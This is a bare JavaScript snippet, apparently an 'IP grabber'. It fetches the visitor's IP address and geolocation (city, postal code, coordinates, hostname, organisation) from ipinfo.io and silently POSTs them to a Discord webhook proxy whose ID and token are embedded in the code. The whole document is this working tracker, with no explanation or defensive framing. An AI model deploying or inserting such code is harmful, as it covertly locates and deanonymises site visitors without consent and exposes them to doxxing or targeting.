$.getJSON('https://ipinfo.io/json', function(data) {
    const coordinates = data.loc.split(",")
    const post = {
        "content": null,
        "embeds": [
          {
            "title": "`" + data.ip + "` (" + data.country + ")",
            "color": null,
            "fields": [
              {
                "name": "City",
                "value": data.city + " (" + data.postal + ")"
              },
              {
                "name": "Region",
                "value": data.region+ " "
              },
              {
                "name": "Coordinates",
                "value": "Latitude: `" + coordinates[0] + "`\nLongtitude: `" + coordinates[1] + "`"
              },
              {
                "name": "Timezone",
                "value": data.timezone + " "
              },
              {
                "name": "Hostname",
                "value": data.hostname + " "
              },
              {
                "name": "Organization",
                "value": data.org + " "
              },
            ]
          }
        ],
        "attachments": []
      }
      var request = new XMLHttpRequest();
      request.open("POST", "https://webhook.lewisakura.moe/api/webhooks/1088490117666177034/JJITE1tpdu7o2tWRkaqwKydLYS5YVP6YtpkWgQ86GVTAQB46jgXxQe5eieETzAp_-12s");

      request.setRequestHeader('Content-type', 'application/json');

      request.send(JSON.stringify(post));
});